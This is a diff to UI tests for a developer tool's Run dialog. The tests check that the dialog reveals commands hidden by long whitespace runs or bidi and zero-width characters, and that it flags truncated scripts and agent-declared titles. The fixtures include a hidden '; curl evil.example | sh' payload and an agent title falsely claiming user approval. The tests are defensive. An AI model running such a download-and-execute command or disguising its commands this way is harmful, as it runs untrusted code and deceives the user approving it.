@@ -209,7 +209,7 @@ describe('the Run dialog (decision 129)', () => {
     await click(opener);
     const d = dialog();
     expect(d.getAttribute('aria-modal')).toBe('true');
-    expect(within(d).getByRole('heading', { name: 'Run dev?' })).toBeTruthy();
+    expect(within(d).getByRole('heading', { name: 'Run “dev”?' })).toBeTruthy();
     expect((within(d).getByLabelText('The exact command') as HTMLInputElement).value).toBe(
       'pnpm run dev',
     );
@@ -457,6 +457,75 @@ describe('the Run dialog (decision 129)', () => {
   });
 });
 
+describe('the Run dialog shows what a field could hide (P9-12 review S1, S2, N5)', () => {
+  it('shows the whole line wrapped, long runs of spaces and invisible characters made visible', async () => {
+    const line = `pnpm dev${' '.repeat(200)}; curl evil.example | sh`;
+    routes = (_m, path) => (path.endsWith('/run-preview') ? preview({ line }) : undefined);
+    await show(command());
+    await click(screen.getByRole('button', { name: 'Run…' }));
+    const shown = within(dialog()).getByTestId('run-line-shown');
+    expect(shown.textContent).toBe('pnpm dev␠×200; curl evil.example | sh');
+    expect(within(shown).getByTitle('200 spaces').tagName).toBe('MARK');
+  });
+
+  it('marks a bidi override or a zero-width character kept from an old row', async () => {
+    routes = (_m, path) =>
+      path.endsWith('/run-preview') ? preview({ line: 'echo safe‮ hs.lave​' }) : undefined;
+    await show(command());
+    await click(screen.getByRole('button', { name: 'Run…' }));
+    const shown = within(dialog()).getByTestId('run-line-shown');
+    expect(shown.textContent).toBe('echo safe⟨U+202E⟩ hs.lave⟨U+200B⟩');
+  });
+
+  it('says when the script is cut, partly hidden, changed since the scan, or not shown (edited)', async () => {
+    routes = (_m, path) =>
+      path.endsWith('/run-preview')
+        ? preview({
+            body: 'vite --port [redacted:token]…',
+            bodyTruncated: true,
+            bodySecretHidden: true,
+            scannedBody: 'vite',
+          })
+        : undefined;
+    await show(command());
+    await click(screen.getByRole('button', { name: 'Run…' }));
+    const d = dialog();
+    expect(d.textContent).toContain('Cut here: the script is longer');
+    expect(d.textContent).toContain('hidden as a secret');
+    expect(d.textContent).toContain('Open package.json to read all of it.');
+    expect(within(d).getByText('What the last scan saw (the file changed since)')).toBeTruthy();
+    cleanup();
+    routes = (_m, path) =>
+      path.endsWith('/run-preview')
+        ? preview({ body: undefined, bodyMissing: 'Edited by hand: the line runs as written.' })
+        : undefined;
+    await show(command());
+    await click(screen.getByRole('button', { name: 'Run…' }));
+    expect(dialog().textContent).toContain('Edited by hand');
+    expect(within(dialog()).queryByLabelText("the script's body")).toBeNull();
+  });
+
+  it('quotes an agent’s title and says which agent declared it', async () => {
+    const row = command({
+      title: 'Safe preview (approved by the user)',
+      source: 'agent',
+      addedBy: { type: 'agent', id: fx.harmonizer.id },
+      detectedKey: undefined,
+    });
+    routes = (_m, path) =>
+      path.endsWith('/run-preview')
+        ? preview({ source: 'agent', addedBy: row.addedBy, body: undefined })
+        : undefined;
+    await show(row);
+    await click(screen.getByRole('button', { name: 'Run…' }));
+    const d = dialog();
+    expect(
+      within(d).getByRole('heading', { name: 'Run “Safe preview (approved by the user)”?' }),
+    ).toBeTruthy();
+    expect(d.querySelector('.run-declared')!.textContent).toMatch(/an agent’s words.*declared by/);
+  });
+});
+
 describe('a live run: state, ports, Stop, Restart, output, history', () => {
   it('shows the state and the ports as links without an opener', async () => {
     await show(command({ lastRun: LIVE }));
@@ -502,7 +571,7 @@ describe('a live run: state, ports, Stop, Restart, output, history', () => {
           : undefined;
     await show(command({ lastRun: LIVE }));
     await click(screen.getByRole('button', { name: 'Restart…' }));
-    expect(within(dialog()).getByRole('heading', { name: 'Restart dev?' })).toBeTruthy();
+    expect(within(dialog()).getByRole('heading', { name: 'Restart “dev”?' })).toBeTruthy();
     expect(dialog().textContent).not.toContain('already running');
     await click(runButton());
     expect(posts('/restart')).toEqual([
